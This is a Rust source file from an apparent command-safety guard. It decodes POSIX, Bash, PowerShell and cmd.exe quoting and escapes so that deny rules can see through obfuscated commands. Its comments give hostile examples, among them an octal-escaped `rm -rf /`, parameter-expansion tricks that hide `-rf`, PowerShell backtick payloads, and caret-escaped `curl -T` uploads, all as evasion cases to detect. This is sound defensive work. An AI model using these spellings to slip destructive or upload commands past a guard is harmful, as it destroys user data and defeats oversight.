pub(crate) fn decode_posix_literal_word(token: &str) -> Option<Cow<'_, str>> {
    decode_posix_token(token, true)
}

fn decode_posix_token(token: &str, literal_word: bool) -> Option<Cow<'_, str>> {
    if !token
        .as_bytes()
        .iter()
        .any(|byte| matches!(*byte, b'\'' | b'"' | b'\\' | b'$' | b'`' | b'<' | b'>'))
    {
        return (!literal_word || !token.contains(['*', '?', '[', '{', '~']))
            .then_some(Cow::Borrowed(token));
    }

    let mut output = String::with_capacity(token.len());
    let mut chars = token.chars().peekable();
    let mut quote = PosixQuote::Unquoted;
    let mut changed = false;

    while let Some(ch) = chars.next() {
        match quote {
            PosixQuote::Single => {
                if ch == '\'' {
                    quote = PosixQuote::Unquoted;
                    changed = true;
                } else {
                    output.push(ch);
                }
            }
            PosixQuote::Double => match ch {
                '"' => {
                    quote = PosixQuote::Unquoted;
                    changed = true;
                }
                '\\' => {
                    let escaped = chars.next()?;
                    match escaped {
                        '\n' => changed = true,
                        '\r' if chars.peek() == Some(&'\n') => {
                            chars.next();
                            changed = true;
                        }
                        '$' | '`' | '"' | '\\' => {
                            output.push(escaped);
                            changed = true;
                        }
                        other => {
                            // POSIX retains a backslash before characters that
                            // are not special inside double quotes.
                            output.push('\\');
                            output.push(other);
                        }
                    }
                }
                '$' if literal_word && !posix_dollar_expands(chars.peek().copied()) => {
                    output.push('$');
                }
                '$' | '`' => return None,
                other => output.push(other),
            },
            PosixQuote::Unquoted => match ch {
                '\'' => {
                    quote = PosixQuote::Single;
                    changed = true;
                }
                '"' => {
                    quote = PosixQuote::Double;
                    changed = true;
                }
                '\\' => {
                    let escaped = chars.next()?;
                    changed = true;
                    match escaped {
                        '\n' => {}
                        '\r' if chars.peek() == Some(&'\n') => {
                            chars.next();
                        }
                        other => output.push(other),
                    }
                }
                '$' if chars.peek() == Some(&'\'')
                    && !crate::context::PlainDollarQuoteReading::active() =>
                {
                    chars.next();
                    if decode_ansi_c_quoted(&mut chars, &mut output).is_err() {
                        return None;
                    }
                    changed = true;
                }
                '$' if chars.peek() == Some(&'"') => {
                    if literal_word {
                        return None; // The locale may replace the program.
                    }
                    // Bash locale-translation quoting has double-quote shell
                    // semantics after translation. Literal option spellings
                    // are deterministic; nested expansions still fail open.
                    chars.next();
                    quote = PosixQuote::Double;
                    changed = true;
                }
                '$' if literal_word && !posix_dollar_expands(chars.peek().copied()) => {
                    output.push('$');
                }
                '$' | '`' => return None,
                '<' | '>' if literal_word || chars.peek() == Some(&'(') => return None,
                '*' | '?' | '[' | '{' | '~' if literal_word => return None,
                other => output.push(other),
            },
        }
    }

    if quote != PosixQuote::Unquoted {
        return None;
    }

    if changed {
        Some(Cow::Owned(output))
    } else {
        Some(Cow::Borrowed(token))
    }
}

pub(crate) fn posix_dollar_expands(next: Option<char>) -> bool {
    next.is_some_and(|ch| {
        ch.is_ascii_alphanumeric()
            || matches!(
                ch,
                '_' | '(' | '{' | '[' | '$' | '?' | '!' | '#' | '@' | '*' | '-'
            )
    })
}

/// The byte ranges of the values one raw POSIX argv word holds: each
/// parameter expansion (`$x`, `${x}`, `${x:-a}`, `$1`, `$?`), command
/// substitution (`$(…)`, backquotes) and arithmetic expansion (`$((…))`,
/// `$[…]`) the shell replaces before the program starts, outside single
/// quotes and ANSI-C quotes and not escaped (`\$x` is literal). A `$` before
/// anything else is literal. A quote opened and never closed returns `None`;
/// an expansion that never closes runs to the end of the word.
pub(crate) fn posix_word_value_ranges(raw: &str) -> Option<Vec<Range<usize>>> {
    let bytes = raw.as_bytes();
    let mut ranges = Vec::new();
    let mut double = false;
    let mut index = 0usize;
    while index < bytes.len() {
        match bytes[index] {
            b'\\' => index += 2,
            b'\'' if !double => index += 1 + raw[index + 1..].find('\'')? + 1,
            b'$' if !double && crate::context::ansi_c_quote_starts_at(bytes, index) => {
                index += 2;
                loop {
                    match bytes.get(index)? {
                        b'\\' => index += 2,
                        b'\'' => break,
                        _ => index += 1,
                    }
                }
                index += 1;
            }
            b'$' if !double && bytes.get(index + 1) == Some(&b'"') => {
                double = true;
                index += 2;
            }
            b'"' => {
                double = !double;
                index += 1;
            }
            b'`' => {
                let mut end = index + 1;
                loop {
                    match bytes.get(end) {
                        Some(b'\\') => end += 2,
                        Some(b'`') => break,
                        Some(_) => end += 1,
                        None => break,
                    }
                }
                let end = (end + 1).min(bytes.len());
                ranges.push(index..end);
                index = end;
            }
            b'$' if posix_dollar_expands(raw[index + 1..].chars().next()) => {
                let end = match bytes[index + 1] {
                    b'{' => crate::context::consume_braced_parameter(raw, index).0,
                    b'(' => consume_shell_paren_construct(bytes, index + 2, bytes.len()),
                    b'[' => raw[index..]
                        .find(']')
                        .map_or(raw.len(), |close| index + close + 1),
                    first if first.is_ascii_alphabetic() || first == b'_' => {
                        let mut end = index + 2;
                        while bytes
                            .get(end)
                            .is_some_and(|byte| byte.is_ascii_alphanumeric() || *byte == b'_')
                        {
                            end += 1;
                        }
                        end
                    }
                    _ => index + 2,
                };
                ranges.push(index..end);
                index = end;
            }
            _ => index += 1,
        }
    }
    (!double).then_some(ranges)
}

/// One raw POSIX argv word with each value the shell substitutes in it
/// ([`posix_word_value_ranges`]) replaced by `value`, quotes and escapes kept
/// for the decoder. `None` when the word holds no value or its quoting is
/// unterminated.
pub(crate) fn posix_word_with_values_replaced(raw: &str, value: &str) -> Option<String> {
    let ranges = posix_word_value_ranges(raw)?;
    if ranges.is_empty() {
        return None;
    }
    let mut output = String::with_capacity(raw.len() + ranges.len() * value.len());
    let mut copied = 0usize;
    for range in ranges {
        output.push_str(&raw[copied..range.start]);
        output.push_str(value);
        copied = range.end;
    }
    output.push_str(&raw[copied..]);
    Some(output)
}

/// An unknown parameter value in a reconstructed argv: one word that no rule
/// reads as an option or a protected path.
pub(crate) const POSIX_PARAMETER_VALUE: &str = "__dcg_parameter_value__";

const MAX_PARAMETER_READING_DEPTH: usize = 16;
const MAX_PARAMETER_READING_BYTES: usize = 16 * 1024;

/// The argv fields of one raw POSIX word when every parameter in it is unset
/// or empty (`[0]`) and when every parameter is set to an unknown value
/// (`[1]`).
///
/// Expansions decide a word's argv: `-${Y}W` gives `-W` when `Y` is unset,
/// `${X:--rf /tmp/zz}` gives the two fields `-rf` and `/tmp/zz`, and
/// `${X:+--force}` gives `--force` when `X` is set. The text as written proves
/// neither that a flag is present nor that it is absent, so callers read both:
/// a destructive rule may deny on either reading, and an exemption must hold
/// on both. Across words, callers also mix them ([`posix_reading_choices`]).
/// Within one word, mixed readings (one parameter set, another unset) are not
/// tried.
///
/// A set parameter reads as the one opaque word [`POSIX_PARAMETER_VALUE`];
/// `$#`, `$?`, `$$`, `$!` and `$-` are always set. Quote removal and Bash
/// field splitting on the default IFS (blank, tab, newline) are applied, the
/// latter only to unquoted expansion results; pathname, brace and tilde
/// expansion are not, so those characters stay literal.
///
/// A command substitution or arithmetic expansion inside double quotes is one
/// field of unknown text, so it reads as [`POSIX_PARAMETER_VALUE`] in both
/// readings, like `$?`.
///
/// `None` means the fields depend on an unquoted command or process
/// substitution or arithmetic expansion, or the quoting is malformed or too
/// deep.
pub(crate) fn posix_parameter_word_readings(raw: &str) -> Option<[Vec<String>; 2]> {
    if raw.len() > MAX_PARAMETER_READING_BYTES {
        return None;
    }
    let chars: Vec<char> = raw.chars().collect();
    let read = |set: bool| {
        let mut reading = PosixWordReading::default();
        reading.expand(&chars, set, PosixReadingContext::WORD, 0)?;
        Some(reading.finish())
    };
    Some([read(false)?, read(true)?])
}

/// At most this many words whose two readings differ are mixed; 2^6 = 64
/// argv choices.
const MAX_MIXED_READING_WORDS: usize = 6;

/// Argv choices for a command whose words each have an unset (`[0]`) and a
/// set (`[1]`) reading ([`posix_parameter_word_readings`]): one reading index
/// per word. One parameter may be set while another is unset, so
/// `rm ${X:--rf} $DIR` runs `rm -rf <DIR>` though neither uniform reading
/// shows it. The every-unset and every-set choices come first, then each mix.
///
/// The flag is `false` when more than [`MAX_MIXED_READING_WORDS`] words
/// differ: then only the two uniform choices are given, which may judge a
/// denial but cannot prove an exemption.
pub(crate) fn posix_reading_choices<T: PartialEq>(words: &[[T; 2]]) -> (Vec<Vec<usize>>, bool) {
    let varying: Vec<usize> = words
        .iter()
        .enumerate()
        .filter(|(_, [unset, set])| unset != set)
        .map(|(index, _)| index)
        .collect();
    let complete = varying.len() <= MAX_MIXED_READING_WORDS;
    let mut choices = vec![vec![0; words.len()]];
    if !varying.is_empty() {
        choices.push(vec![1; words.len()]);
    }
    if complete {
        for mask in 1..(1usize << varying.len()).saturating_sub(1) {
            let mut choice = vec![0; words.len()];
            for (bit, &word) in varying.iter().enumerate() {
                choice[word] = (mask >> bit) & 1;
            }
            choices.push(choice);
        }
    }
    (choices, complete)
}

#[derive(Debug, Clone, Copy)]
struct PosixReadingContext {
    /// Inside double quotes: no field splitting, and `'` is literal.
    double: bool,
    /// Unquoted text here is the result of an expansion, so its blanks
    /// separate fields.
    splits: bool,
}

impl PosixReadingContext {
    const WORD: Self = Self {
        double: false,
        splits: false,
    };
}

#[derive(Debug, Default)]
struct PosixWordReading {
    fields: Vec<String>,
    current: String,
    /// The current field exists even if empty (`""` or `''` was seen).
    present: bool,
    bytes: usize,
}

impl PosixWordReading {
    fn push(&mut self, ch: char, splits: bool) -> Option<()> {
        if splits && matches!(ch, ' ' | '\t' | '\n') {
            if self.present {
                self.fields.push(std::mem::take(&mut self.current));
                self.present = false;
            }
            return Some(());
        }
        self.bytes += ch.len_utf8();
        if self.bytes > MAX_PARAMETER_READING_BYTES {
            return None;
        }
        self.current.push(ch);
        self.present = true;
        Some(())
    }

    fn push_str(&mut self, text: &str) -> Option<()> {
        text.chars().try_for_each(|ch| self.push(ch, false))
    }

    fn finish(mut self) -> Vec<String> {
        if self.present {
            self.fields.push(self.current);
        }
        self.fields
    }

    fn expand(
        &mut self,
        chars: &[char],
        set: bool,
        context: PosixReadingContext,
        depth: usize,
    ) -> Option<()> {
        if depth > MAX_PARAMETER_READING_DEPTH {
            return None;
        }
        let mut index = 0usize;
        let mut double = context.double;
        while let Some(&ch) = chars.get(index) {
            index += 1;
            let splits = context.splits && !double;
            match ch {
                '\\' => {
                    let escaped = *chars.get(index)?;
                    index += 1;
                    if escaped == '\n' {
                        continue;
                    }
                    if double && !matches!(escaped, '$' | '`' | '"' | '\\') {
                        self.push('\\', false)?;
                    }
                    self.push(escaped, false)?;
                }
                '\'' if !double => {
                    let close = chars[index..].iter().position(|c| *c == '\'')?;
                    for &quoted in &chars[index..index + close] {
                        self.push(quoted, false)?;
                    }
                    self.present = true;
                    index += close + 1;
                }
                '"' => {
                    double = !double;
                    self.present = true;
                }
                // Quoted, a command substitution's output is one field
                // whose text is unknown, read like a set parameter; unquoted,
                // it may give any fields.
                '`' if double => {
                    let rest: String = chars[index..].iter().collect();
                    let close =
                        crate::packs::core::git::find_posix_substitution_close(&rest, 0, b'`')
                            .ok()?;
                    index += rest[..close].chars().count() + 1;
                    self.parameter_value(true)?;
                }
                '`' => return None,
                '<' | '>' if !double && chars.get(index) == Some(&'(') => return None,
                '$' => {
                    let context = PosixReadingContext {
                        double,
                        splits: context.splits,
                    };
                    index = self.dollar(chars, index, set, context, depth)?;
                }
                _ => self.push(ch, splits)?,
            }
        }
        (double == context.double).then_some(())
    }

    /// Read the expansion after a `$` at `chars[index - 1]`; returns the index
    /// after it.
    fn dollar(
        &mut self,
        chars: &[char],
        index: usize,
        set: bool,
        context: PosixReadingContext,
        depth: usize,
    ) -> Option<usize> {
        match chars.get(index).copied() {
            Some('{') => {
                let close = posix_parameter_brace_close(chars, index + 1)?;
                self.braced(&chars[index + 1..close], set, context, depth)?;
                Some(close + 1)
            }
            Some('(') if context.double => {
                let rest: String = chars[index..].iter().collect();
                let close =
                    crate::packs::core::git::find_posix_substitution_close(&rest, 1, b')').ok()?;
                self.parameter_value(true)?;
                Some(index + rest[..close].chars().count() + 1)
            }
            Some('(') => None,
            Some('\'') if !context.double => {
                let rest: String = chars[index + 1..].iter().collect();
                let mut tail = rest.chars().peekable();
                let mut decoded = String::new();
                decode_ansi_c_quoted(&mut tail, &mut decoded).ok()?;
                let consumed = rest.chars().count() - tail.count();
                self.push_str(&decoded)?;
                self.present = true;
                Some(index + 1 + consumed)
            }
            // Locale quoting reads as double quotes; the `"` is next.
            Some('"') if !context.double => Some(index),
            Some(ch) if ch.is_ascii_alphabetic() || ch == '_' => {
                let len = chars[index..]
                    .iter()
                    .take_while(|c| c.is_ascii_alphanumeric() || **c == '_')
                    .count();
                self.parameter_value(set)?;
                Some(index + len)
            }
            Some(ch) if ch.is_ascii_digit() || matches!(ch, '@' | '*') => {
                self.parameter_value(set)?;
                Some(index + 1)
            }
            Some('#' | '?' | '$' | '!' | '-') => {
                self.parameter_value(true)?;
                Some(index + 1)
            }
            _ => {
                self.push('$', context.splits && !context.double)?;
                Some(index)
            }
        }
    }

    fn parameter_value(&mut self, set: bool) -> Option<()> {
        if set {
            self.push_str(POSIX_PARAMETER_VALUE)?;
        }
        Some(())
    }

    /// Read `${inner}`.
    fn braced(
        &mut self,
        inner: &[char],
        set: bool,
        context: PosixReadingContext,
        depth: usize,
    ) -> Option<()> {
        // `${#NAME}` is a length, always set; `${!NAME}` is an indirection.
        // `${#}` and `${!}` alone are always-set special parameters.
        let (inner, always_set) = match inner {
            ['#'] | ['!'] => (inner, true),
            ['#', rest @ ..] => (rest, true),
            ['!', rest @ ..] => (rest, false),
            _ => (inner, false),
        };
        let name_len = match inner.first() {
            Some(ch) if ch.is_ascii_alphabetic() || *ch == '_' => inner
                .iter()
                .take_while(|c| c.is_ascii_alphanumeric() || **c == '_')
                .count(),
            Some(ch) if ch.is_ascii_digit() => {
                inner.iter().take_while(|c| c.is_ascii_digit()).count()
            }
            Some('@' | '*' | '#' | '?' | '$' | '!' | '-') => 1,
            _ => return None,
        };
        // Nested expansions keep this reading's choice (`set`); only this
        // parameter may be forced set.
        let parameter_set = set || always_set || matches!(inner[0], '#' | '?' | '$' | '!' | '-');
        let operator = &inner[name_len..];
        let operand = |prefix: &str| {
            let prefix: Vec<char> = prefix.chars().collect();
            operator.strip_prefix(prefix.as_slice())
        };
        let default = [":-", ":=", ":?", "-", "=", "?"]
            .iter()
            .find_map(|prefix| operand(prefix).map(|word| (word, prefix.ends_with('?'))));
        let alternate = operand(":+").or_else(|| operand("+"));
        // The operand of an unquoted expansion is field split; quotes inside
        // it still protect their text.
        let operand_context = PosixReadingContext {
            double: context.double,
            splits: !context.double,
        };
        match (default, alternate) {
            (Some((word, fails_when_unset)), _) => {
                if parameter_set {
                    self.parameter_value(true)
                } else if fails_when_unset {
                    // `${X:?}` aborts the command when X is unset.
                    Some(())
                } else {
                    self.expand(word, set, operand_context, depth + 1)
                }
            }
            (None, Some(word)) => {
                if parameter_set {
                    self.expand(word, set, operand_context, depth + 1)
                } else {
                    Some(())
                }
            }
            // A bare name, a subscript, or a pattern, case or substring
            // operator: nothing when unset, an unknown value when set.
            (None, None) => self.parameter_value(parameter_set),
        }
    }
}

/// The index of the `}` closing a `${` whose body starts at `start`.
fn posix_parameter_brace_close(chars: &[char], start: usize) -> Option<usize> {
    let mut index = start;
    let mut depth = 0usize;
    let mut single = false;
    let mut double = false;
    while let Some(&ch) = chars.get(index) {
        match ch {
            '\\' if !single => index += 1,
            '\'' if !double => single = !single,
            '"' if !single => double = !double,
            '$' if !single && chars.get(index + 1) == Some(&'{') => {
                depth += 1;
                index += 1;
            }
            '}' if !single && !double => {
                if depth == 0 {
                    return Some(index);
                }
                depth -= 1;
            }
            _ => {}
        }
        index += 1;
    }
    None
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) struct InvalidAnsiCQuote;

/// Decode the body of a Bash `$'…'` string, the opening `$'` already
/// consumed, through its closing quote.
pub(crate) fn decode_ansi_c_quoted(
    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
    output: &mut String,
) -> Result<(), InvalidAnsiCQuote> {
    while let Some(ch) = chars.next() {
        if ch == '\'' {
            return Ok(());
        }
        if ch != '\\' {
            output.push(ch);
            continue;
        }

        let escaped = chars.next().ok_or(InvalidAnsiCQuote)?;
        match escaped {
            '\n' => {}
            '\r' if chars.peek() == Some(&'\n') => {
                chars.next();
            }
            'a' => output.push('\u{0007}'),
            'b' => output.push('\u{0008}'),
            'e' | 'E' => output.push('\u{001b}'),
            'f' => output.push('\u{000c}'),
            'n' => output.push('\n'),
            'r' => output.push('\r'),
            't' => output.push('\t'),
            'v' => output.push('\u{000b}'),
            '\\' | '\'' | '"' | '?' => output.push(escaped),
            'c' => {
                let control = chars.next().ok_or(InvalidAnsiCQuote)?;
                if !control.is_ascii() {
                    return Err(InvalidAnsiCQuote);
                }
                let byte = control as u8;
                let value = if byte == b'?' {
                    0x7f
                } else {
                    byte.to_ascii_uppercase() & 0x1f
                };
                if value == 0 {
                    return discard_ansi_c_quote_tail(chars);
                }
                output.push(char::from(value));
            }
            'x' => {
                let value = consume_radix_digits(chars, 16, 2).ok_or(InvalidAnsiCQuote)?;
                if value == 0 {
                    return discard_ansi_c_quote_tail(chars);
                }
                if value > u32::from(u8::MAX) {
                    return Err(InvalidAnsiCQuote);
                }
                output.push(char::from_u32(value).ok_or(InvalidAnsiCQuote)?);
            }
            'u' => {
                let value = consume_radix_digits(chars, 16, 4).ok_or(InvalidAnsiCQuote)?;
                if value == 0 {
                    return discard_ansi_c_quote_tail(chars);
                }
                output.push(char::from_u32(value).ok_or(InvalidAnsiCQuote)?);
            }
            'U' => {
                let value = consume_radix_digits(chars, 16, 8).ok_or(InvalidAnsiCQuote)?;
                if value == 0 {
                    return discard_ansi_c_quote_tail(chars);
                }
                output.push(char::from_u32(value).ok_or(InvalidAnsiCQuote)?);
            }
            first @ '0'..='7' => {
                let mut value = first.to_digit(8).ok_or(InvalidAnsiCQuote)?;
                for _ in 0..2 {
                    let Some(next) = chars.peek().copied() else {
                        break;
                    };
                    let Some(digit) = next.to_digit(8) else {
                        break;
                    };
                    chars.next();
                    value = value
                        .checked_mul(8)
                        .and_then(|n| n.checked_add(digit))
                        .ok_or(InvalidAnsiCQuote)?;
                }
                // bash and zsh keep the low byte of an overlong octal
                // escape: `$'\562'` is `r` (0o562 & 0xff), not an error. An
                // error here left `rm $'-\562f' /` undecoded, i.e. unread.
                let value = value & 0xff;
                if value == 0 {
                    return discard_ansi_c_quote_tail(chars);
                }
                output.push(char::from_u32(value).ok_or(InvalidAnsiCQuote)?);
            }
            other => {
                // Bash preserves the backslash for unknown ANSI-C escapes.
                output.push('\\');
                output.push(other);
            }
        }
    }

    Err(InvalidAnsiCQuote)
}

/// Bash strings cannot contain NUL. Within `$'...'`, the first decoded NUL
/// truncates that quoted segment's value, while parsing still continues to its
/// closing quote and any later concatenated shell text remains significant.
fn discard_ansi_c_quote_tail(
    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
) -> Result<(), InvalidAnsiCQuote> {
    while let Some(ch) = chars.next() {
        match ch {
            '\\' => {
                chars.next().ok_or(InvalidAnsiCQuote)?;
            }
            '\'' => return Ok(()),
            _ => {}
        }
    }
    Err(InvalidAnsiCQuote)
}

fn consume_radix_digits(
    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
    radix: u32,
    max_digits: usize,
) -> Option<u32> {
    let mut value = 0u32;
    let mut consumed = 0usize;
    while consumed < max_digits {
        let digit = chars.peek().and_then(|ch| ch.to_digit(radix));
        let Some(digit) = digit else {
            break;
        };
        chars.next();
        value = value.checked_mul(radix)?.checked_add(digit)?;
        consumed += 1;
    }
    (consumed > 0).then_some(value)
}

/// Reads the `{hex}` of a PowerShell 6+ `` `u{hex} `` escape (one to six hex
/// digits, a valid code point). On anything else nothing is consumed: the
/// escape is then the letter `u`, as Windows PowerShell 5.1 reads it.
pub(crate) fn decode_powershell_unicode_escape(
    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
) -> Option<char> {
    let mut probe = chars.clone();
    if probe.next() != Some('{') {
        return None;
    }
    let value = consume_radix_digits(&mut probe, 16, 6)?;
    if probe.next() != Some('}') {
        return None;
    }
    let decoded = char::from_u32(value)?;
    *chars = probe;
    Some(decoded)
}

thread_local! {
    static POWERSHELL_CONTROL_ESCAPES: std::cell::Cell<bool> = const { std::cell::Cell::new(false) };
}

/// While alive, PowerShell syntax tokens on this thread read a backtick
/// escape (`` `n `` `` `r `` `` `t `` `` `0 `` `` `a `` `` `b `` `` `f `` `` `v ``
/// and a valid `` `u{hex} ``) as the control character PowerShell makes of
/// it, not as the letter. The evaluator enters it for a second reading of a
/// command that may be PowerShell; see [`has_powershell_control_escape`].
pub(crate) struct PowerShellControlEscapeScope {
    previous: bool,
}

impl PowerShellControlEscapeScope {
    #[must_use]
    pub(crate) fn enter() -> Self {
        Self {
            previous: POWERSHELL_CONTROL_ESCAPES.with(|slot| slot.replace(true)),
        }
    }
}

impl Drop for PowerShellControlEscapeScope {
    fn drop(&mut self) {
        POWERSHELL_CONTROL_ESCAPES.with(|slot| slot.set(self.previous));
    }
}

/// Whether a [`PowerShellControlEscapeScope`] is alive on this thread.
#[must_use]
pub(crate) fn powershell_control_escapes_active() -> bool {
    POWERSHELL_CONTROL_ESCAPES.with(std::cell::Cell::get)
}

/// Whether the command holds a backtick escape that PowerShell reads as a
/// control character, so the control-character reading can differ from the
/// letter reading. Quoting is not checked: a backtick in single quotes only
/// costs one more reading.
#[must_use]
pub(crate) fn has_powershell_control_escape(command: &str) -> bool {
    command.as_bytes().windows(2).any(|pair| {
        pair[0] == b'`'
            && matches!(
                pair[1],
                b'n' | b'r' | b't' | b'0' | b'a' | b'b' | b'f' | b'v' | b'u'
            )
    })
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum PowerShellQuote {
    Unquoted,
    Single,
    Double,
}

/// Whether a raw PowerShell word is the stop-parsing token `--%`, after
/// which PowerShell hands the rest of the line (up to a pipe or newline) to
/// the program as written.
///
/// PowerShell stops parsing for `--%` spelled bare, with backticks (`` -`-%
/// ``) or with a quoted part after its first character (`--'%'`). A word
/// that starts with a quote (`'--%'`, `"--%"`, `‘--%’`) is dropped from a
/// native program's argv but does not stop parsing: `$x = 'a'; git '--%'
/// $x` hands git `a`, and `Write-Output '--%'; git status` runs git
/// (measured with pwsh 7.5). [`ShellTokenDecoder::decode`] consumes both.
#[must_use]
pub(crate) fn powershell_word_stops_parsing(raw: &str) -> bool {
    const QUOTES: [char; 9] = [
        '\'', '"', '\u{2018}', '\u{2019}', '\u{201A}', '\u{201B}', '\u{201C}', '\u{201D}',
        '\u{201E}',
    ];
    !raw.starts_with(QUOTES) && decode_powershell_syntax_token(raw).as_ref() == "--%"
}

fn decode_powershell_syntax_token(token: &str) -> Cow<'_, str> {
    if !token
        .as_bytes()
        .iter()
        .any(|byte| matches!(*byte, b'\'' | b'"' | b'`'))
    {
        return Cow::Borrowed(token);
    }

    let mut output = String::with_capacity(token.len());
    let mut chars = token.chars().peekable();
    let mut quote = PowerShellQuote::Unquoted;
    let mut changed = false;

    while let Some(ch) = chars.next() {
        match quote {
            PowerShellQuote::Single => {
                if ch == '\'' {
                    if chars.peek() == Some(&'\'') {
                        // PowerShell represents a literal apostrophe inside a
                        // single-quoted string by doubling it.
                        chars.next();
                        output.push('\'');
                    } else {
                        quote = PowerShellQuote::Unquoted;
                    }
                    changed = true;
                } else {
                    // Backticks are ordinary bytes in verbatim single quotes.
                    output.push(ch);
                }
            }
            PowerShellQuote::Unquoted | PowerShellQuote::Double => match ch {
                '\'' if quote == PowerShellQuote::Unquoted => {
                    quote = PowerShellQuote::Single;
                    changed = true;
                }
                '"' => {
                    quote = if quote == PowerShellQuote::Double {
                        PowerShellQuote::Unquoted
                    } else {
                        PowerShellQuote::Double
                    };
                    changed = true;
                }
                '`' => {
                    let Some(escaped) = chars.next() else {
                        // A trailing backtick is incomplete syntax. Preserve
                        // the entire raw token and fail open.
                        return Cow::Borrowed(token);
                    };
                    changed = true;
                    match escaped {
                        '\n' => {}
                        '\r' if chars.peek() == Some(&'\n') => {
                            chars.next();
                        }
                        // In a double-quoted string and in a bare word a
                        // backtick escape is a control character: `` `n `` and
                        // `` `r `` are line breaks, so a nested `-Command`
                        // payload that holds one runs the text after it as a
                        // new statement. The first reading keeps the letter,
                        // which can still spell a command (`` Fo`rce ``); the
                        // evaluator reads the command again with the control
                        // characters (`PowerShellControlEscapeScope`), and
                        // deny wins. PowerShell 6+ also reads `` `u{hex} `` as
                        // that code point; Windows PowerShell 5.1 reads `` `u ``
                        // and `` `e `` as the letters, so `` `e `` keeps its
                        // letter in both readings.
                        'n' | 'r' | 't' | '0' | 'a' | 'b' | 'f' | 'v' | 'u'
                            if powershell_control_escapes_active() =>
                        {
                            match escaped {
                                'n' => output.push('\n'),
                                'r' => output.push('\r'),
                                't' => output.push('\t'),
                                '0' => output.push('\0'),
                                'a' => output.push('\u{7}'),
                                'b' => output.push('\u{8}'),
                                'f' => output.push('\u{c}'),
                                'v' => output.push('\u{b}'),
                                _ => match decode_powershell_unicode_escape(&mut chars) {
                                    Some(decoded) => output.push(decoded),
                                    None => output.push('u'),
                                },
                            }
                        }
                        other => output.push(other),
                    }
                }
                other => output.push(other),
            },
        }
    }

    if quote != PowerShellQuote::Unquoted {
        // Do not reinterpret malformed/incomplete quoting.
        return Cow::Borrowed(token);
    }

    if changed {
        Cow::Owned(output)
    } else {
        Cow::Borrowed(token)
    }
}

fn decode_cmd_syntax_token(token: &str) -> Cow<'_, str> {
    if !token
        .as_bytes()
        .iter()
        .any(|byte| matches!(*byte, b'"' | b'^'))
    {
        return Cow::Borrowed(token);
    }

    let mut output = String::with_capacity(token.len());
    let mut chars = token.chars().peekable();
    let mut in_double_quotes = false;
    let mut changed = false;

    while let Some(ch) = chars.next() {
        match ch {
            '"' => {
                in_double_quotes = !in_double_quotes;
                changed = true;
            }
            '^' if !in_double_quotes => {
                let Some(escaped) = chars.next() else {
                    // A trailing caret is incomplete syntax. Preserve the
                    // entire raw token and fail open.
                    return Cow::Borrowed(token);
                };
                changed = true;
                match escaped {
                    '\n' => {}
                    '\r' if chars.peek() == Some(&'\n') => {
                        chars.next();
                    }
                    other => output.push(other),
                }
            }
            other => output.push(other),
        }
    }

    if in_double_quotes {
        // Do not reinterpret malformed/incomplete quoting.
        return Cow::Borrowed(token);
    }

    if changed {
        Cow::Owned(output)
    } else {
        Cow::Borrowed(token)
    }
}

/// Decode the non-structural caret escapes that `cmd.exe` removes before it
/// passes a word to the invoked program.
///
/// Unlike [`decode_cmd_syntax_token`], this view deliberately retains quotes
/// and caret-escaped shell metacharacters. Removing the caret from `^&`, `^|`,
/// `^<`, `^>`, `^(`, or `^)` would turn literal argument data into an apparent
/// command boundary or redirection when the normalized string is tokenized
/// again. Ordinary argv bytes are safe to reveal: `-^T`, `st^op`, and
/// `dr^op.example.com` reach the invoked program as `-T`, `stop`, and
/// `drop.example.com`, respectively. Carets inside double quotes are literal
/// in Cmd and remain untouched.
fn decode_cmd_pattern_piece(piece: &str) -> Cow<'_, str> {
    if !piece.contains('^') {
        return Cow::Borrowed(piece);
    }

    let mut output = String::with_capacity(piece.len());
    let mut chars = piece.chars().peekable();
    let mut in_double_quotes = false;
    let mut changed = false;

    while let Some(ch) = chars.next() {
        match ch {
            '"' => {
                in_double_quotes = !in_double_quotes;
                output.push(ch);
            }
            '^' if !in_double_quotes => {
                let Some(escaped) = chars.next() else {
                    // A trailing caret is incomplete syntax. Preserve the
                    // entire piece rather than guessing at Cmd's recovery.
                    return Cow::Borrowed(piece);
                };
                match escaped {
                    '\n' => changed = true,
                    '\r' if chars.peek() == Some(&'\n') => {
                        chars.next();
                        changed = true;
                    }
                    // A caret-escaped quote reaches the native command line as
                    // argv grouping, but it never opens a Cmd quote. Drop it
                    // from the matching view instead of synthesizing a bare
                    // quote: a later tokenizer must not let `^"safe& curl^"`
                    // swallow the real `&` separator. This still makes
                    // `curl ^"-T^"` equivalent to `curl -T`.
                    '"' => {
                        changed = true;
                    }
                    // Retain escape provenance for bytes whose bare form would
                    // change the command structure on a later tokenizer pass.
                    '^' | '&' | '|' | '<' | '>' | '(' | ')' => {
                        output.push('^');
                        output.push(escaped);
                    }
                    other if other.is_whitespace() => {
                        output.push('^');
                        output.push(other);
                    }
                    other => {
                        output.push(other);
                        changed = true;
                    }
                }
            }
            other => output.push(other),
        }
    }

    if in_double_quotes {
        // Do not reinterpret malformed/incomplete quoting.
        return Cow::Borrowed(piece);
    }

    if changed {
        Cow::Owned(output)
    } else {
        Cow::Borrowed(piece)
    }
}

/// Build the Cmd matching view from raw-token boundaries.
///
/// Tokenizing first is essential for one-layer semantics. For example, the
/// first two carets in `^^&` produce a literal caret while the following `&`
/// remains a real command separator. Retaining `^^` in the word and the raw
/// separator as distinct pieces prevents a later tokenizer from treating the
/// synthesized caret as an escape for that separator.
fn decode_cmd_pattern_view(command: &str) -> Cow<'_, str> {
    if !command.contains('^') {
        return Cow::Borrowed(command);
    }

    let tokens = tokenize_cmd_raw(command);
    let mut output = String::with_capacity(command.len());
    let mut last = 0usize;
    let mut changed = false;
    let mut segment_has_command = false;
    let mut command_is_assignment = false;

    for token in &tokens {
        let Some(gap) = command.get(last..token.byte_range.start) else {
            return Cow::Borrowed(command);
        };
        let decoded_gap = decode_cmd_pattern_piece(gap);
        changed |= decoded_gap.as_ref() != gap;
        output.push_str(decoded_gap.as_ref());

        let Some(raw) = token.text(command) else {
            return Cow::Borrowed(command);
        };
        if token.kind == NormalizeTokenKind::Separator {
            output.push_str(raw);
            segment_has_command = false;
            command_is_assignment = false;
        } else if !segment_has_command {
            let decoded = decode_cmd_pattern_piece(raw);
            command_is_assignment = is_env_assignment(decoded.as_ref());
